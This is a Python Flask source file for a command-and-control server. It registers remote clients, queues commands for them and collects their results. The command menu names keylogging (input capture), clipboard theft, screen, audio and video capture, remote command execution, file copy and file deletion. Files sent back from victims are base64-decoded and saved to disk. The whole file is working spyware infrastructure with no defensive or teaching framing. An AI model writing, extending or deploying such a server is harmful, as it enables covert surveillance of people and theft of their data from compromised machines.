# server.py
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import json
import uuid
import datetime
import logging
import base64

app = Flask(__name__)
CORS(app)

clients = {}
commands = {}
command_results = {}


available_commands = {
    'system_info': {
        'name': 'System Information Discovery',
        'description': 'Get detailed system information'
    },
    'command_line': {
        'name': 'Command-Line Interface',
        'description': 'Execute commands via command line'
    },
    'file_directory_discovery': {
        'name': 'File and Directory Discovery',
        'description': 'Discover files and directories in system'
    },
    'remote_file_copy': {
        'name': 'Remote File Copy',
        'description': 'Copy files remotely between systems'
    },
    'file_deletion': {
        'name': 'File Deletion',
        'description': 'Delete files from specified path'
    },
    'process_discovery': {
        'name': 'Process Discovery',
        'description': 'Discover running processes on system'
    },
    'input_capture': {
        'name': 'Input Capture',
        'description': 'Capture system input activities'
    },
    'clipboard_data': {
        'name': 'Clipboard Data',
        'description': 'Access clipboard data content'
    },
    'screen_capture': {
        'name': 'Screen Capture',
        'description': 'Capture screen content'
    },
    'audio_capture': {
        'name': 'Audio Capture',
        'description': 'Capture system audio'
    },
    'video_capture': {
        'name': 'Video Capture',
        'description': 'Capture video content'
    }
}


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='server.log'
)


@app.route('/')
def home():
    return render_template('dashboard.html')


@app.route('/register', methods=['POST'])
def register_client():
    client_data = request.get_json()
    client_id = str(uuid.uuid4())
    
    clients[client_id] = {
        'hostname': client_data.get('hostname'),
        'ip': request.remote_addr,
        'os': client_data.get('os'),
        'last_seen': datetime.datetime.now().isoformat(),
        'status': 'active'
    }
    
    logging.info(f"New client registered: {client_id}")
    return jsonify({'client_id': client_id})



@app.route('/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
        pending_commands = [cmd for cmd in commands.items() if cmd[1]['client_id'] == client_id and not cmd[1]['executed']]
        return jsonify({'commands': pending_commands})
    return jsonify({}), 404



@app.route('/available-commands', methods=['GET'])
def get_available_commands():
    logging.info("Available commands requested")
    return jsonify(available_commands)


@app.route('/command', methods=['POST'])
def add_command():
    command_data = request.get_json()
    command_id = str(uuid.uuid4())
    
    if command_data['command_type'] not in available_commands:
        return jsonify({'error': 'Invalid command type'}), 400
        
    
    commands[command_id] = {
        'client_id': command_data['client_id'],
        'command_type': command_data['command_type'],
        'timestamp': datetime.datetime.now().isoformat(),
        'executed': False,
        'str' : command_data["command_str"]
    }
    
    logging.info(f"New command added: {command_id}")
    return jsonify({'command_id': command_id})

@app.route('/result/<command_id>', methods=['POST'])
def submit_result(command_id):
    if command_id in commands:
        result_data = request.get_json()
        command_results[command_id] = {
            'output': result_data['output'],
            'timestamp': datetime.datetime.now().isoformat(),
            'file' : result_data['file'],
            'file_format' : result_data['format']
        }
        commands[command_id]['executed'] = True
        file_format = ""
        if command_results[command_id]['file_format']:
            file_format = command_results[command_id]['file_format']
        if command_results[command_id]['file']:
            decoded_file = base64.b64decode(command_results[command_id]['file'])
            with open(f"files/{str(datetime.datetime.now().isoformat())}.{file_format}", "wb") as file:
                file.write(decoded_file)
        return jsonify({'status': 'success'})
    return jsonify({'error': 'Command not found'}), 404


@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(clients)


@app.route('/results', methods=['GET'])
def get_results():
    return jsonify(command_results)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)